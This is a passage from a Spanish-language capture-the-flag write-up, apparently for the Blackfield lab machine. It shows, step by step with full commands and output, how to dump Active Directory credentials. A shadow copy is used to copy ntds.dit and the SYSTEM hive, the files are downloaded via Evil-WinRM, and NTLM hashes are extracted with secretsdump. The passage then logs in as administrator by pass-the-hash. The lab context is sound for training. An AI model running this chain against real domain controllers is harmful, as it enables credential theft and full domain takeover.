Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/6/2024 10:09:38 AM

-> set context persistent nowriters
-> set metadata c:\\programdata\\test.cab
The existing file will be overwritten.
-> set verbose on
-> add volume c: alias test
-> create

Alias test for shadow ID {aff5187b-adc4-46a1-8cf4-edfbb66a296b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {bcb506a2-03ea-4a87-9ab5-7d1695f08377} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file DisD84D.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {bcb506a2-03ea-4a87-9ab5-7d1695f08377}

	* Shadow copy ID = {aff5187b-adc4-46a1-8cf4-edfbb66a296b}		%test%
		- Shadow copy set: {bcb506a2-03ea-4a87-9ab5-7d1695f08377}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 10/6/2024 10:09:39 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {aff5187b-adc4-46a1-8cf4-edfbb66a296b}
The  drive letter is already in use.
```

`Copiamos` el archivo `ntds` a la `ubicación actual`

```
*Evil-WinRM* PS C:\programdata> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
```

`Copiamos` el archivo `system`

```
*Evil-WinRM* PS C:\programdata> reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
The operation completed successfully.
```

`Descargamos` ambos `archivos`

```
*Evil-WinRM* PS C:\programdata> download ntds.dit
                                        
Info: Downloading C:\programdata\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata> download SYSTEM
                                        
Info: Downloading C:\programdata\SYSTEM to SYSTEM
                                        
Info: Download successful!
```

Ahora extraemos los hashes de `NTDS.dit` con `SYSTEM` como clave. Nos descargamos el `NTDS.dit` en vez de la `SAM` debido a que el `NTDS.dit` es la `base de datos del active directory` mientras que la sam es la `base de datos de cuentas locales`, como estamos ante un `active directory` nos descargamos el ntds.dit. El archivo `SYSTEM` también es necesario debido a que almacena las `claves de cifrado` que se utilizan para desencriptar los hashes de contraseñas almacenados en los archivos `SAM` y `NTDS.dit`

```
# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c73ad1d511d727f037abc106a2613051:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

`Validamos` las `credenciales`

```
netexec winrm 10.129.153.116 -u administrator -H 184fb5e5178480be64824d4cd53b99ee   
WINRM       10.129.153.116  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.153.116  5985   DC01             [+] BLACKFIELD.local\administrator:184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Nos `conectamos` a la `máquina víctima` como el usuario `administrador`

```
evil-winrm -i 10.129.153.116 -u administrator -H '184fb5e5178480be64824d4cd53b99ee'  
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
```
